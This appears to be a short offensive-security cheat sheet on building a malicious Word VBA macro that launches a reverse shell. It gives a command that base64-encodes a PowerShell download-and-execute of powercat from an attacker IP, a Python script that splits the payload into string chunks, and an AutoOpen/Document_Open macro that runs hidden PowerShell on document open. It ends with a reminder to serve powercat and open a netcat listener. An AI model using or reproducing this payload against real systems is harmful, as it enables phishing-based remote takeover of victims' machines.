# VBA Macro to launch revshell

## Encode powercat download and exec with base64 (UTF16-LE)

```
echo -n "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.x/powercat.ps1');powercat -c 192.168.119.x -p 4444 -e powershell" | iconv --to-code UTF-16LE | base64 -w0
```

### Split base64 strings with python script

```python
str = "powershell.exe -nop -w hidden -e {B64}"

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```

### Macro

```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    
    --snipp--

    CreateObject("Wscript.Shell").Run Str
End Sub
```

Don't forget to serve powercat via a python web server and to open a netcat listener
